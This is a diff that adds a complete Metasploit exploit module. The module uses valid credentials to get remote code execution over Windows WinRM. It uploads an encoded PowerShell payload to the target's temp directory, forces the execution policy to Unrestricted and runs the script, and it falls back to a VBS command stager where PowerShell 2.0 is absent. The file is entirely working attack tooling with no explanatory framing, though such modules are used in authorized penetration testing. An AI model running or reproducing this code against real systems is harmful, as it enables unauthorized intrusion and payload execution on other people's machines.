@@ -1,0 +1,239 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+
+require 'msf/core'
+
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ManualRanking
+
+	include Msf::Exploit::Remote::WinRM
+	include Msf::Exploit::CmdStagerVBS
+
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'WinRM VBS Remote Code Execution',
+			'Description'    => %q{
+					This module uses valid credentials to login to the WinRM service
+					and execute a payload. It has two available methods for payload
+					delivery: Powershell 2.0 and VBS CmdStager.
+
+					The module will check if Powershell 2.0 is available, and if so uses
+					that method. Otherwise it falls back to the VBS Cmdstager which is
+					less stealthy.
+
+					IMPORTANT: If targeting an x64 system with the Powershell method
+					you MUST select an x64 payload. An x86 payload will never return.
+			},
+			'Author'         => [ 'thelightcosine' ],
+			'License'        => MSF_LICENSE,
+			'Privileged'     => true,
+			'DefaultOptions' =>
+				{
+					'WfsDelay'     => 30,
+					'EXITFUNC' => 'thread',
+					'InitialAutoRunScript' => 'post/windows/manage/smart_migrate',
+				},
+			'Platform'       => 'win',
+			'Arch'          => [ ARCH_X86, ARCH_X86_64 ],
+			'Targets'        =>
+				[
+					[ 'Windows', { } ],
+				],
+			'DefaultTarget'  => 0,
+			'DisclosureDate' => 'Nov 01 2012'
+		))
+
+		register_options(
+			[
+				OptBool.new('FORCE_VBS', [ true, 'Force the module to use the VBS CmdStager', false])
+			], self.class
+		)
+
+		register_advanced_options(
+		[
+			OptString.new( 'DECODERSTUB',  [ true, 'The VBS base64 file decoder stub to use.',
+				File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "vbs_b64_sleep")]),
+		], self.class)
+
+	end
+
+	def check
+		unless accepts_ntlm_auth
+			print_error "The Remote WinRM  server  does not appear to allow Negotiate(NTLM) auth"
+			return Msf::Exploit::CheckCode::Safe
+		end
+
+		return Msf::Exploit::CheckCode::Vulnerable
+	end
+
+
+	def exploit
+		unless  check == Msf::Exploit::CheckCode::Vulnerable
+			return
+		end
+		if powershell2?
+			return unless correct_payload_arch?
+			path = upload_script
+			return if path.nil?
+			exec_script(path)
+		else
+			execute_cmdstager
+		end
+		handler
+	end
+
+	def execute_command(cmd,opts)
+		commands = cmd.split(/&/)
+		commands.each do |command|
+			if command.include? "cscript"
+				streams = winrm_run_cmd_hanging(command)
+				print_status streams.inspect
+			elsif command.include? "del %TEMP%"
+				next
+			else
+				winrm_run_cmd(command)
+			end
+		end
+	end
+
+	def upload_script
+		tdir = temp_dir
+		return if tdir.nil?
+		path = tdir + "\\" + ::Rex::Text.rand_text_alpha(8) + ".ps1"
+		print_status "Uploading powershell script to #{path} (This may take a few minutes)..."
+
+		script = Msf::Util::EXE.to_win32pe_psh(framework,payload.encoded)
+		#add a sleep to the script to give us enoguh time to establish a session
+		script << "\n Start-Sleep -s 600"
+		script.each_line do |psline|
+			#build our psh command to write out our psh script, meta eh?
+			script_line = "Add-Content #{path} '#{psline.chomp}' "
+			cmd = encoded_psh(script_line)
+			streams = winrm_run_cmd(cmd)
+		end
+		return path
+	end
+
+	def exec_script(path)
+		print_status "Attempting to execute script..."
+		cmd = "powershell -File #{path}"
+		winrm_run_cmd_hanging(cmd)
+	end
+
+	def encoded_psh(script)
+		script = script.chars.to_a.join("\x00").chomp
+		script << "\x00" unless script[-1].eql? "\x00"
+		script = Rex::Text.encode_base64(script).chomp
+		cmd = "powershell -encodedCommand #{script}"
+	end
+
+	def temp_dir
+		print_status "Grabbing %TEMP%"
+		resp,c = send_request_ntlm(winrm_open_shell_msg)
+		if resp.nil?
+			print_error "Got no reply from the server"
+			return nil
+		end
+		unless resp.code == 200
+			print_error "Got unexpected response: \n #{resp.to_s}"
+			return nil
+		end
+		shell_id = winrm_get_shell_id(resp)
+		cmd = "echo %TEMP%"
+		resp,c = send_request_ntlm(winrm_cmd_msg(cmd, shell_id))
+		cmd_id = winrm_get_cmd_id(resp)
+		resp,c = send_request_ntlm(winrm_cmd_recv_msg(shell_id,cmd_id))
+		streams = winrm_get_cmd_streams(resp)
+		return streams['stdout'].chomp
+	end
+
+	def check_remote_arch
+		wql = %q{select AddressWidth from Win32_Processor where DeviceID="CPU0"}
+		resp,c = send_request_ntlm(winrm_wql_msg(wql))
+		#Default to x86 if we can't be sure
+		return "x86" if resp.nil? or resp.code != 200
+		resp_tbl = parse_wql_response(resp)
+		addr_width =  resp_tbl.rows.flatten[0]
+		if addr_width == "64"
+			return "x64"
+		else
+			return "x86"
+		end
+	end
+
+	def correct_payload_arch?
+		target_arch = check_remote_arch
+		case target_arch
+		when "x64"
+			unless datastore['PAYLOAD'].include? "x64"
+				print_error "You selected an x86 payload for an x64 target!"
+				return false
+			end
+		when "x86"
+			if datastore['PAYLOAD'].include? "x64"
+				print_error "you selected an x64 payload for an x86 target"
+				return false
+			end
+		end
+		return true
+	end
+
+
+	def powershell2?
+		if datastore['FORCE_VBS']
+			print_status "User selected the FORCE_VBS option"
+			return false
+		end
+		print_status "checking for Powershell 2.0"
+		streams = winrm_run_cmd("powershell Get-Host")
+		if streams == 401
+			print_error "Login failed!"
+			return false
+		end
+		unless streams.class == Hash
+			print_error "Recieved error while running check"
+			return false
+		end
+		if streams['stderr'].include? "not recognized"
+			print_error "Powershell is not installed"
+			return false
+		end
+		streams['stdout'].each_line do |line|
+			next unless line.start_with? "Version"
+			major_version = line.match(/\d(?=\.)/)[0]
+			if major_version == "1"
+				print_error "The target is running an older version of powershell"
+				return false
+			end
+		end
+
+		print_status "Attempting to set Execution Policy"
+		streams = winrm_run_cmd("powershell Set-ExecutionPolicy Unrestricted")
+		if streams == 401
+			print_error "Login failed!"
+			return false
+		end
+		unless streams.class == Hash
+			print_error "Recieved error while running check"
+			return false
+		end
+		streams = winrm_run_cmd("powershell Get-ExecutionPolicy")
+		if streams['stdout'].include? 'Unrestricted'
+			print_good "Set Execution Policy Successfully"
+			return true
+		end
+		return false
+	end
+
+end
